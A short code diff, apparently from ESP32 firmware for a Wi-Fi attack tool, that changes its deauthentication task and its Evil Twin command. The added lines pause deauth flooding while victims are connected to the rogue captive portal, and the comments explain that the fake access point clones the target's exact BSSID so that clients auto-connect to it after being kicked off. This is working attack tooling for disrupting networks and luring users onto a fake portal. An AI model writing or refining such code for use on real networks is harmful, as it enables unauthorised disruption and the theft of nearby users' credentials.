@@ -3931,6 +3931,13 @@ static void deauth_attack_task(void *pvParameters) {
         }
         
         if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
+            // In Evil Twin mode, pause deauth when clients are connected
+            // to our portal — otherwise we kick our own clients because
+            // we share the same BSSID as the target AP.
+            if (applicationState == DEAUTH_EVIL_TWIN && portal_connected_clients > 0) {
+                vTaskDelay(pdMS_TO_TICKS(500));
+                continue;
+            }
             // Send deauth frames (silent mode - no UART spam)
             ESP_ERROR_CHECK(led_set_color(0, 0, 255));
             wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
@@ -7186,8 +7193,9 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             // AP mode was enabled by ensure_ap_mode(), update the configuration
             ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
 
-            // Clone the BSSID of the target network so clients recognize
-            // this AP as the same access point they were connected to.
+            // Clone the exact BSSID of the target network so clients
+            // auto-connect to our AP after deauth.  The deauth task
+            // pauses when clients are connected to avoid kicking them.
             {
                 int target_idx = g_selected_indices[0];
                 uint8_t *target_bssid = g_scan_results[target_idx].bssid;
